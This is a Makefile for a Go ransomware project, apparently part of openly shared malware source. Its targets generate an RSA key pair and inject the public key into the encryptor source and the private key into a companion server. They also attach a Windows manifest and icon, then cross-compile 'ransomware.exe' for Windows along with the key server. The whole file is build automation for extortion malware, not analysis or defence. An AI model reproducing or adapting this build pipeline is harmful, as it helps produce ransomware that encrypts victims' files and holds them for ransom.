.PHONY: all

all: build clean

pre-build:
	openssl genrsa -out private.pem 2048
	openssl rsa -in private.pem -outform PEM -pubout -out public.pem
	rsrc -manifest ransomware.exe.manifest -ico icon.ico -o ransomware.syso
	mkdir -p build
	perl -pi.bak -e 's/INJECT_PUB_KEY_HERE/`echo -n "\n"; cat public.pem`/e' encrypt.go
	perl -pi.bak -e 's/INJECT_PRIV_KEY_HERE/`echo -n "\n"; cat private.pem`/e' server/main.go

build: pre-build
	env GOOS=windows go build && mv ransomware.exe build
	cd server && go build && mv `ls|grep server` ../build

simple-build:
	rsrc -manifest ransomware.exe.manifest -ico icon.ico -o ransomware.syso
	mkdir -p build
	env GOOS=windows go build && mv ransomware.exe build
	cd server && go build && mv `ls|grep server` ../build
	rm ransomware.syso
	
clean:
	rm private.pem public.pem
	rm ransomware.syso
	mv encrypt.go.bak encrypt.go
	mv server/main.go.bak server/main.go
